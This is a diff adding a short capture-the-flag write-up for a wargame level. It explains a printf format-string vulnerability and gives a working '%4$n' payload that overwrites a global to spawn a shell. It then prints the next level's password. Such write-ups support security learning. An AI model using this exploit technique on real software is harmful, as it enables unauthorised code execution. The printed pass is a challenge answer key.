@@ -1,0 +1,24 @@
+with gdb we see there is a function v()
+
+that call fgets and printf, and system("/bin/sh")
+printf is vulnerable because it uses the result of fgets as it's format string
+
+to trigger the call to system we need to match a comparison with 64
+-> 0x080484da <+54>:	mov    0x804988c,%eax
+-> 0x080484df <+59>:	cmp    $0x40,%eax
+
+so we try 
+
+./level3
+%x
+200
+
+it works
+to write inside the adress in the beggining of the string we use %n as it's 4 bytes
+we will use %4$n
+
+%n will write the number of bytes outputed as int in the adress given
+
+(python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")' ; cat) | ./level3
+cd ../level4 ; cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
